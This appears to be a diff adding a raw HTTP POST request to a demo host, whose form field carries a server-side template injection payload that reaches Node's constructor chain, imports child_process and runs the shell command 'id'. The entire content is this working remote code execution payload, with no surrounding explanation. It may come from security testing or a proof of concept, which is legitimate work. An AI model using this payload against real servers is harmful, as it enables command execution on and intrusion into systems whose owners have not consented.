@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 111
+Connection: close
+
+s={{ ranges.constructor.constructor(&quot;return import&quot;)()(&#39;child_process&#39;).exec(&#39;id&#39;) }}
